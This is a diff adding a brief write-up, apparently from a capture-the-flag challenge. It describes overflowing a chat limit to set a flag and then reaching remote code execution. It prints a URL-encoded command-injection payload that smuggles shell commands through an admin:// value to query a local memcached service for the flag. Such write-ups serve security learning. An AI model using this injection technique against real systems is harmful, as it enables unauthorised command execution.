@@ -1,0 +1,5 @@
+This is a run through the code. We need to find first how to set a flag to 1, by adding more chats than are actually allowed, then we basically get RCE.
+
+The payload for the RCE is very straight-forward:
+admin://+(printf+"get+flag\nquit\n"%3b+sleep+1)+|+telnet+localhost+11211+|+tail+-n+2+|+head+-n+1+||
+
